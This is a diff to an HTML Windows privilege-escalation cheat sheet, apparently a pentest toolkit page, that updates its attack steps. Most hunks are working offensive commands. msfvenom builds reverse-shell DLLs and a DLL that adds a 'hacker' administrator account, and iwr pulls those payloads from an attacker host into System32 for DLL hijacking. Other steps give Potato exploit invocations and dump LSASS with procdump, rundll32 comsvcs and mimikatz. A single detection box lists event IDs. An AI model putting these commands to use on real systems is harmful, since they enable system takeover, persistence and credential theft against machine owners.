@@ -1002,7 +1002,8 @@ REM Extended privilege set (may fail on NETWORK SERVICE):
           </div>
           <div style="font-family:'Share Tech Mono',monospace;font-size:11px;line-height:1.9;">
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win XP / Server 2003 (build &lt;6000)</span> &rarr; <span style="color:#a8ff78;">churrasco.exe</span></div>
-            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win7 SP1 (7601) / Server 2008 R2 &rarr; Server 2012 R2 (9600)</span> &rarr; <span style="color:#a8ff78;">GodPotato-NET4</span> or <span style="color:#a8ff78;">JuicyPotatoNG</span></div>
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win7 SP1 (7601) / Server 2008 R2</span> &rarr; <span style="color:#a8ff78;">JuicyPotato</span> (original) or <span style="color:#a8ff78;">MSFRottenPotato</span></div>
+            <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Server 2012 / Win8 &rarr; Server 2012 R2 (9600)</span> &rarr; <span style="color:#a8ff78;">GodPotato-NET4</span> or <span style="color:#a8ff78;">JuicyPotatoNG</span></div>
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win10 (15063&ndash;19041) / Server 2016&ndash;2019 (14393&ndash;17763)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> (best) OR <span style="color:#a8ff78;">PrintSpoofer</span> (Spooler must run)</div>
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win10 20H2+ / Server 2019+ (17763+)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> | <span style="color:#a8ff78;">JuicyPotatoNG</span> fallback</div>
             <div style="margin-bottom:6px;"><span style="color:#ff6b6b;font-weight:bold;">Win11 / Server 2022 (build 22000+)</span> &rarr; <span style="color:#a8ff78;">GodPotato</span> OR <span style="color:#a8ff78;">SigmaPotato</span></div>
@@ -1229,7 +1230,7 @@ REM PrintSpoofer mode (default; Spooler required):
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">&#9733;</span>
-            <span><strong>Flags:</strong> <code>-e &lt;DCOM|WinRM|EfsRpc|PrintSpoofer&gt;</code> exploit mode (default: PrintSpoofer) | <code>-p &lt;prog&gt;</code> program | <code>-a &lt;args&gt;</code> arguments | <code>-c &lt;CLSID&gt;</code> override CLSID | <code>-l &lt;port&gt;</code> COM listen port (default: 6666)</span>
+            <span><strong>Flags:</strong> <code>-e &lt;DCOM|EfsRpc|PrintSpoofer&gt;</code> exploit mode (default: PrintSpoofer) | <code>-p &lt;prog&gt;</code> program | <code>-a &lt;args&gt;</code> arguments | <code>-c &lt;CLSID&gt;</code> override CLSID | <code>-l &lt;port&gt;</code> COM listen port (default: 6666)</span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">&#128279;</span>
@@ -1588,6 +1589,7 @@ REM The BITS service calls WinRM on 5985 at startup → connects to your fake li
             <div class="step-content">
               <div class="step-title">Generate malicious PrintConfig.dll on Kali</div>
               <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll
+cp PrintConfig.dll ~/privesc-toolkit/windows/PrintConfig.dll  # Place in http server windows/ dir
 # Serve it: python3 -m http.server {{PORT}}</div>
             </div>
           </div>
@@ -1662,6 +1664,7 @@ systeminfo</div>
             <div class="code-block purple">msfvenom -p windows/x64/exec \
   CMD='cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add' \
   -f dll -o AddUser.dll
+cp AddUser.dll ~/privesc-toolkit/windows/AddUser.dll  # Place in http server windows/ dir
 python3 -m http.server {{PORT}}</div>
           </div></div>
           <div class="step">
@@ -1675,9 +1678,9 @@ copy "C:\Windows\System32\wbem\tzres.dll" "{{WPATH}}\tzres.dll.bak" 2>nul & echo
           </div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
             <div class="step-title">Windows — download and place as PrintConfig.dll or tzres.dll</div>
-            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/AddUser.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/AddUser.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"
 # OR place as tzres.dll for systeminfo trigger:
-iwr http://{{KALI_IP}}:{{PORT}}/AddUser.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"</div>
+iwr http://{{KALI_IP}}:{{PORT}}/windows/AddUser.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"</div>
           </div></div>
           <div class="step"><div class="step-num">3</div><div class="step-content">
             <div class="step-title">Windows — trigger the DLL load</div>
@@ -1718,6 +1721,7 @@ impacket-psexec hacker:'P@ss123!'@{{TARGET}}</div>
           <div class="step"><div class="step-num">1</div><div class="step-content">
             <div class="step-title">Kali — generate tzres.dll payload (or reuse existing PrintConfig.dll)</div>
             <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o tzres.dll
+cp tzres.dll ~/privesc-toolkit/windows/tzres.dll  # Place in http server windows/ dir
 python3 -m http.server {{PORT}}</div>
           </div></div>
           <div class="step">
@@ -1729,7 +1733,7 @@ python3 -m http.server {{PORT}}</div>
           </div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
             <div class="step-title">Windows — place tzres.dll (C:\ is already writable from exploit step)</div>
-            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
 # Verify it's there:
 Get-Item "C:\Windows\System32\wbem\tzres.dll" | Select-Object Length,LastWriteTime</div>
           </div></div>
@@ -1760,6 +1764,7 @@ Get-Item "C:\Windows\System32\wbem\tzres.dll" | Select-Object Length,LastWriteTi
           <div class="step"><div class="step-num">1</div><div class="step-content">
             <div class="step-title">Kali &mdash; generate wbemcomn.dll</div>
             <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o wbemcomn.dll
+cp wbemcomn.dll ~/privesc-toolkit/windows/wbemcomn.dll  # Place in http server windows/ dir
 python3 -m http.server {{PORT}}</div>
           </div></div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
@@ -1776,7 +1781,7 @@ REM NOTE: wbemcomn.dll ALWAYS exists — this is a real system file. Backup is M
           </div>
           <div class="step"><div class="step-num">3</div><div class="step-content">
             <div class="step-title">Windows &mdash; drop the DLL into System32 (requires C:\ write from SeManageVolumeExploit)</div>
-            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/wbemcomn.dll -OutFile "C:\Windows\System32\wbemcomn.dll"</div>
+            <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/wbemcomn.dll -OutFile "C:\Windows\System32\wbemcomn.dll"</div>
           </div></div>
           <div class="step"><div class="step-num">4</div><div class="step-content">
             <div class="step-title">Windows &mdash; trigger WMI to load the DLL (wmiprvse.exe runs as SYSTEM)</div>
@@ -1845,7 +1850,7 @@ python3 -m http.server {{PORT}}</div>
           <div class="step"><div class="step-num">3</div><div class="step-content">
             <div class="step-title">Windows — upload nc64.exe first (if using shell variant), then DLL</div>
             <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -o C:\Users\Public\Documents\nc64.exe
-iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
+iwr http://{{KALI_IP}}:{{PORT}}/windows/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
           </div></div>
           <div class="step"><div class="step-num">4</div><div class="step-content">
             <div class="step-title">Kali — listener (use nc for the WinExec/nc64 variant)</div>
@@ -1910,8 +1915,8 @@ $object = [Activator]::CreateInstance($type)</div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Dump LSASS full memory (-ma = all regions, -64 = force 64-bit context)</div>
-              <div class="code-block">C:\Temp\procdump64.exe -accepteula -64 -ma lsass.exe C:\Temp\lsass.dmp</div>
+              <div class="step-title">Dump LSASS full memory (-ma = all regions)</div>
+              <div class="code-block">C:\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp</div>
             </div>
           </div>
           <div class="step">
@@ -1937,7 +1942,7 @@ mimikatz # sekurlsa::logonpasswords</div>
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">One-liner from elevated PowerShell — no binary upload required</div>
-              <div class="code-block green">rundll32 C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full</div>
+              <div class="code-block green">rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full</div>
             </div>
           </div>
           <div class="step">
@@ -1945,7 +1950,7 @@ mimikatz # sekurlsa::logonpasswords</div>
             <div class="step-content">
               <div class="step-title">Alternative — explicit PID if Get-Process is constrained</div>
               <div class="code-block">tasklist /fi "imagename eq lsass.exe"
-rundll32 C:\Windows\System32\comsvcs.dll MiniDump &lt;LSASS_PID&gt; C:\Temp\lsass.dmp full</div>
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump &lt;LSASS_PID&gt; C:\Temp\lsass.dmp full</div>
             </div>
           </div>
           <div class="step">
@@ -2865,7 +2870,7 @@ REM HKLM — driver was loaded under HKLM\System\CurrentControlSet\Services\ (no
 
       <div class="detection-box">
         <div class="detection-title">🔍 Detection</div>
-        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 7045 — new service/driver installed • Event 4657 — registry key creation under HKCU\System\CurrentControlSet\&lt;ServiceName&gt; • Unsigned or blocklisted driver load attempt • fltMC.exe unloading security minifilter drivers • EOPLOADDRIVER.exe or ExploitCapcom.exe execution</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 7045 — new service/driver installed • Event 4657 — registry key creation under HKLM\System\CurrentControlSet\Services\&lt;ServiceName&gt; (Win10 1803+) • Unsigned or blocklisted driver load attempt • fltMC.exe unloading security minifilter drivers • EOPLOADDRIVER.exe or ExploitCapcom.exe execution</div>
       </div>
     </div>
 
@@ -4430,12 +4435,13 @@ C:\Temp\cve26229.exe</div>
           <div class="alert alert-gold"><span class="alert-icon">💡</span><span>NTLM local authentication confusion → write SprintCSP.dll to a PATH directory → trigger StorSvc SvcRebootToFlashingMode → SYSTEM. <strong>No SeImpersonate needed</strong> — pure CVE + DLL hijack.</span></div>
           <div class="step"><div class="step-num">1</div><div class="step-content">
             <div class="step-title">Generate malicious SprintCSP.dll</div>
-            <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o SprintCSP.dll</div>
+            <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o SprintCSP.dll
+cp SprintCSP.dll ~/privesc-toolkit/windows/SprintCSP.dll  # Place in http server windows/ dir</div>
           </div></div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
             <div class="step-title">Transfer LocalPotato and the DLL</div>
             <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/LocalPotato.exe -o C:\Temp\LocalPotato.exe
-iwr http://{{KALI_IP}}:{{PORT}}/SprintCSP.dll -o C:\Temp\SprintCSP.dll</div>
+iwr http://{{KALI_IP}}:{{PORT}}/windows/SprintCSP.dll -o C:\Temp\SprintCSP.dll</div>
           </div></div>
           <div class="step"><div class="step-num">3</div><div class="step-content">
             <div class="step-title">Start listener and trigger</div>
@@ -4701,7 +4707,8 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"</
         <div class="section-body">
           <table class="priv-table">
             <tr><th>OS</th><th>Best Potato</th><th>Command</th></tr>
-            <tr><td>Server 2008-2019, Win7-10</td><td>GodPotato</td><td><code>.\GodPotato-NET4.exe -cmd "cmd"</code></td></tr>
+            <tr><td>Server 2012-2022, Win8-11</td><td>GodPotato</td><td><code>.\GodPotato-NET4.exe -cmd "cmd"</code></td></tr>
+            <tr><td>Server 2008 R2, Win7 SP1</td><td>JuicyPotato (original)</td><td><code>.\JuicyPotato.exe -l 9999 -p cmd.exe -t *</code></td></tr>
             <tr><td>Win10 1809+, Server 2019</td><td>PrintSpoofer</td><td><code>.\PrintSpoofer.exe -i -c cmd</code></td></tr>
             <tr><td>Server 2019+</td><td>JuicyPotatoNG</td><td><code>.\JuicyPotatoNG.exe -t * -p cmd.exe</code></td></tr>
             <tr><td>Missing SeImpersonate</td><td>FullPowers first</td><td><code>.\FullPowers.exe -c ".\GodPotato..."</code></td></tr>
